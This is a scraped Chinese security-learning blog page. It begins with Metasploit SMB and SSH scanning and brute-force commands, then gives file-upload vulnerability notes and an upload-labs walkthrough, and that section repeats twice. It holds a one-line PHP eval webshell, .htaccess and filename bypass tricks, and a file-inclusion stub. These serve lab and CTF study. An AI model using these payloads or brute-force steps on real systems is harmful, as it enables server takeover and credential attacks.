msf auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 10.10.10.148</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_lookupsid) &gt; run</code></pre><h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul>
<li>SSH 版本扫描<ul>
<li>use auxiliary/scanner/ssh/ssh_version</li>
</ul>
</li>
<li>SSH 密码爆破<ul>
<li>use auxiliary/scanner/ssh/ssh_login<ul>
<li>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ；set VERBOSE false ；run</li>
</ul>
</li>
</ul>
</li>
<li>SSH 公钥登陆<ul>
<li>use auxiliary/scanner/ssh/ssh_login_pubkey<ul>
<li>set KEY_FILE id_rsa；set USERNAME root ；run</li>
</ul>
</li>
</ul>
</li>
<li>SSH 版本扫描</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_version
msf auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ssh/ssh_version) &gt; run</code></pre><ul>
<li>SSH 密码爆破</li>
</ul>
<pre><code>root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt 

msf &gt; use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
msf auxiliary(scanner/ssh/ssh_login) &gt; set VERBOSE false 
msf auxiliary(scanner/ssh/ssh_login) &gt; run</code></pre><ul>
<li>SSH 公钥登陆</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkey
msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set USERNAME root
msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</code></pre><h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul>
<li><p>基于已经取得的 session 进行检测</p>
</li>
<li><p>use post/windows/gather/enum_patches</p>
<ul>
<li>show advanced</li>
<li>set VERBOSE yes</li>
</ul>
</li>
<li><p>检查失败</p>
<ul>
<li>known bug in WMI query, try migrating to another process</li>
<li>迁移到另一个进程再次进行尝试</li>
</ul>
</li>
<li><p>ms08-067</p>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi/" itemprop="url">“文件上传漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:49:18+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="文件上传-文件包含漏洞学习笔记-靶场实战"><a href="#文件上传-文件包含漏洞学习笔记-靶场实战" class="headerlink" title="文件上传+文件包含漏洞学习笔记+靶场实战"></a>文件上传+文件包含漏洞学习笔记+靶场实战</h1><p>[TOC]</p>
<h2 id="文件上传漏洞部分"><a href="#文件上传漏洞部分" class="headerlink" title="文件上传漏洞部分"></a>文件上传漏洞部分</h2><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p><strong>一.什么是文件上传漏洞</strong></p>
<p> 文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p>
<p><strong>二.文件上传漏洞危害</strong></p>
<ul>
<li>网站被控制，对文件增删改查，执行命令，链接数据库</li>
<li>如果服务器长久未更新，可以利用exp提权，导致服务器沦陷</li>
<li>同服务器的其他网站沦陷。</li>
</ul>
<p><strong>二.文件上传漏洞的主要利用和绕过方式总结。</strong></p>
<p><strong>1.前端JS绕过</strong></p>
<p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p>
<p><strong>2.MIME 类型验证</strong></p>
<p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p>
<p><strong>3.黑名单验证</strong></p>
<p>1.寻找没有过滤的类型：phtml php3 php4 php5  PHP phtml</p>
<p>2.大小写绕过：例如Php</p>
<p><strong>4.文件内容验证</strong></p>
<p>1<strong>.getimagesize()函数获取图像信息</strong>：通过构造图片马进行绕过。</p>
<p>2.<strong>文件头绕过</strong>：例如 GIF89a <?php phpinfo(); ?></p>
<p>2.<strong>检验关键字</strong>&lt;?php:利用script标签绕过：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;/script&gt;</code></p>
<p><strong>6. .htaccess上传</strong></p>
<p>上传的.jpg文件都会以php格式解析</p>
<p>.htaccess内容</p>
<pre><code>AddType   application/x-httpd-php     .jpg</code></pre><p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p>
<p><strong>7.00截断绕过</strong></p>
<p>php.   jpg  将空格二进制20改为00；</p>
<p><strong>8.win系统解析漏洞绕过</strong></p>
<p>1.上传1.php(或者图片马)，抓包修改为1.php.</p>
<p>2.上传1.php(或者图片马)，抓包修改为1.php::$DATA</p>
<p>3.上传1.php(或者图片马)，抓包修改为1.php:1.jpg</p>
<p>4.上传1.php(或者图片马)，抓包修改为1.php::$DATA…….</p>
<p><strong>9.文件包含绕过</strong>：首先上传图片木马shell.jpg，然后上传可以进行文件包含的php文件,比如上传1.php</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>然后我们访问1.php?x=shell.jpg即可。</p>
<p><strong>10.条件竞争绕过</strong></p>
<p>通过BURP不断发包，导致不断写入webshell,再写入速度频率上超过安全软件查杀频率，导致绕过。</p>
<p><strong>11.二次渲染绕过</strong></p>
<p>上传图片加载后，会对图片进行二次渲养，改变大部分图片源码，绕过为：对照上传后的图片与原图片放在winhex中对不，查看图片哪个数据块没有被改变。将木马代码放在没有改变的一块中，在不损坏图片的前提下，即可绕过上传</p>
<p><strong>12.中间件解析漏洞</strong></p>
<p>apache：上传图片马，抓包修改为1.php.xxxx.abc</p>
<p>iis6.0 6.5：上传图片马，抓包修改猴嘴为.asa、.cer和.cdx等。</p>
<p>​                    上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以</p>
<p>​                    上传图片马，抓包发现有保存图片的路径，如../upload/image</p>
<p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p>
<p>​            upload/image/1.jpg/.php</p>
<p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p>
<h4 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h4><p><strong>upolad-labs考察知识点汇总：</strong></p>
<img src="11525934-e19630249b9b8764.png"  />



<p>​    upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
<h5 id="Pass-01-前端js检测"><a href="#Pass-01-前端js检测" class="headerlink" title="Pass-01-前端js检测"></a>Pass-01-前端js检测</h5><p><strong>考察知识点：</strong>前端js检测，我们可以选择禁用js,或者直接burp直接抓包绕过.。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201219.png" alt=""></p>
<h5 id="Pass-02-只检测Content-type"><a href="#Pass-02-只检测Content-type" class="headerlink" title="Pass-02 只检测Content-type"></a>Pass-02 只检测Content-type</h5><p><strong>考察知识点：</strong>Content-Type绕过，我们直接改为 image/jpeg</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201548.png" alt=""></p>
<h5 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h5><p><strong>考察知识点：</strong>黑名单绕过，禁止上传.asp|.aspx|.php|.jsp后缀文件，但是我们可以上传.php3 .phtml .php5另类后缀名。</p>
<h5 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04  .htaccess绕过"></a>Pass-04  .htaccess绕过</h5><p><strong>考察知识点：</strong>构造.htaccess文件，内容为<code>AddType  application/x-httpd-php  .jpg</code></p>
<p>我们首先上传.htaccess文件，</p>
<img src="QQ截图20200124121848.png" style="zoom: 80%;" />



<p>然后上传我们事先准备好的php文件将后缀改为.jpg文件,</p>
<img src="QQ截图20200124122245.png" style="zoom:150%;" />

<p>可以在本地看到成功上传。</p>
<h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h5><p><strong>考察知识点：</strong>因为此次黑名单过滤了.htaccess，但是没有将文件名转换为小写。所以我们可以通过大小写绕过。</p>
<img src="QQ截图20200124124135.png" style="zoom: 80%;" />



<h5 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h5><p><strong>考察知识点</strong>：修改文件后缀为<code>1.php空格</code>.,利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格,达到上传.php的目的</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200124124135.png" alt=""></p>
<h5 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h5><p><strong>考察知识点：</strong>wIndow命名规则:window下 xx.php空格xx.php.不允许存在，系统会默认去除空格或点。此处过滤了空格，但是没有过滤点。我们用burp将文件后缀改为php.即可。</p>
<img src="QQ截图20200124130943.png" style="zoom:150%;" />



<h5 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08  ::$DATA绕过"></a>Pass-08  ::$DATA绕过</h5><p><strong>考察知识点</strong>：$DATA绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
<p>所以：文件后缀改为：<code>xx.php::$DATA</code>即可</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115202909.png" alt=""></p>
<h5 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h5><p>这里我们分析一下源代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>这里其实已经过滤的很严格了。</p>
<p>依次进行了严格的黑名单过滤、转换大小写、去除文件名尾的空格和点。还去除了;$DATA.</p>
<p>但是这里存在很明显的代码逻辑漏洞：代码<strong>去点，除空</strong>的操作只进行了一次。那么我们把后缀名改为</p>
<p><strong>php. .</strong> 点 空格点的格式。最后的后缀名为<strong>.php.</strong> 成功绕过。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115204443.png" alt=""></p>
<h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h5><p>考察知识点:双写绕过，这里利用了<code>str_irepalce</code>函数将不符合上传的后缀名替换为空，且该函数对 大小写不敏感，我们可以通过双写后缀名 .pphphp进行绕过。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115205208.png" alt=""></p>
<h5 id="Pass-11-get-00截断"><a href="#Pass-11-get-00截断" class="headerlink" title="Pass-11 get 00截断"></a>Pass-11 get 00截断</h5><p>考察知识点：00截断</p>
<img src="QQ截图20200124131542.png" style="zoom:50%;" />

<p><strong>Pass-12 Post 00截断</strong></p>
<p>考察知识点：00截断</p>
<p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128202954.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128203026.png" alt=""></p>
<h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi/" itemprop="url">文件上传漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:49:18+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">web漏洞学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="文件上传-文件包含漏洞学习笔记-靶场实战"><a href="#文件上传-文件包含漏洞学习笔记-靶场实战" class="headerlink" title="文件上传+文件包含漏洞学习笔记+靶场实战"></a>文件上传+文件包含漏洞学习笔记+靶场实战</h1><p>[TOC]</p>
<h2 id="文件上传漏洞部分"><a href="#文件上传漏洞部分" class="headerlink" title="文件上传漏洞部分"></a>文件上传漏洞部分</h2><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p><strong>一.什么是文件上传漏洞</strong></p>
<p> 文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p>
<p><strong>二.文件上传漏洞危害</strong></p>
<ul>
<li>网站被控制，对文件增删改查，执行命令，链接数据库</li>
<li>如果服务器长久未更新，可以利用exp提权，导致服务器沦陷</li>
<li>同服务器的其他网站沦陷。</li>
</ul>
<p><strong>二.文件上传漏洞的主要利用和绕过方式总结。</strong></p>
<p><strong>1.前端JS绕过</strong></p>
<p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p>
<p><strong>2.MIME 类型验证</strong></p>
<p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p>
<p><strong>3.黑名单验证</strong></p>
<p>1.寻找没有过滤的类型：phtml php3 php4 php5  PHP phtml</p>
<p>2.大小写绕过：例如Php</p>
<p><strong>4.文件内容验证</strong></p>
<p>1<strong>.getimagesize()函数获取图像信息</strong>：通过构造图片马进行绕过。</p>
<p>2.<strong>文件头绕过</strong>：例如 GIF89a <?php phpinfo(); ?></p>
<p>2.<strong>检验关键字</strong>&lt;?php:利用script标签绕过：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;/script&gt;</code></p>
<p><strong>6. .htaccess上传</strong></p>
<p>上传的.jpg文件都会以php格式解析</p>
<p>.htaccess内容</p>
<pre><code>AddType   application/x-httpd-php     .jpg</code></pre><p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p>
<p><strong>7.00截断绕过</strong></p>
<p>php.   jpg  将空格二进制20改为00；</p>
<p><strong>8.win系统解析漏洞绕过</strong></p>
<p>1.上传1.php(或者图片马)，抓包修改为1.php.</p>
<p>2.上传1.php(或者图片马)，抓包修改为1.php::$DATA</p>
<p>3.上传1.php(或者图片马)，抓包修改为1.php:1.jpg</p>
<p>4.上传1.php(或者图片马)，抓包修改为1.php::$DATA…….</p>
<p><strong>9.文件包含绕过</strong>：首先上传图片木马shell.jpg，然后上传可以进行文件包含的php文件,比如上传1.php</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>然后我们访问1.php?x=shell.jpg即可。</p>
<p><strong>10.条件竞争绕过</strong></p>
<p>通过BURP不断发包，导致不断写入webshell,再写入速度频率上超过安全软件查杀频率，导致绕过。</p>
<p><strong>11.二次渲染绕过</strong></p>
<p>上传图片加载后，会对图片进行二次渲养，改变大部分图片源码，绕过为：对照上传后的图片与原图片放在winhex中对不，查看图片哪个数据块没有被改变。将木马代码放在没有改变的一块中，在不损坏图片的前提下，即可绕过上传</p>
<p><strong>12.中间件解析漏洞</strong></p>
<p>apache：上传图片马，抓包修改为1.php.xxxx.abc</p>
<p>iis6.0 6.5：上传图片马，抓包修改猴嘴为.asa、.cer和.cdx等。</p>
<p>​                    上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以</p>
<p>​                    上传图片马，抓包发现有保存图片的路径，如../upload/image</p>
<p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p>
<p>​            upload/image/1.jpg/.php</p>
<p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p>
<h4 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h4><p><strong>upolad-labs考察知识点汇总：</strong></p>
<img src="11525934-e19630249b9b8764.png"  />



<p>​    upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
<h5 id="Pass-01-前端js检测"><a href="#Pass-01-前端js检测" class="headerlink" title="Pass-01-前端js检测"></a>Pass-01-前端js检测</h5><p><strong>考察知识点：</strong>前端js检测，我们可以选择禁用js,或者直接burp直接抓包绕过.。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201219.png" alt=""></p>
<h5 id="Pass-02-只检测Content-type"><a href="#Pass-02-只检测Content-type" class="headerlink" title="Pass-02 只检测Content-type"></a>Pass-02 只检测Content-type</h5><p><strong>考察知识点：</strong>Content-Type绕过，我们直接改为 image/jpeg</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201548.png" alt=""></p>
<h5 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h5><p><strong>考察知识点：</strong>黑名单绕过，禁止上传.asp|.aspx|.php|.jsp后缀文件，但是我们可以上传.php3 .phtml .php5另类后缀名。</p>
<h5 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04  .htaccess绕过"></a>Pass-04  .htaccess绕过</h5><p><strong>考察知识点：</strong>构造.htaccess文件，内容为<code>AddType  application/x-httpd-php  .jpg</code></p>
<p>我们首先上传.htaccess文件，</p>
<img src="QQ截图20200124121848.png" style="zoom: 80%;" />



<p>然后上传我们事先准备好的php文件将后缀改为.jpg文件,</p>
<img src="QQ截图20200124122245.png" style="zoom:150%;" />

<p>可以在本地看到成功上传。</p>
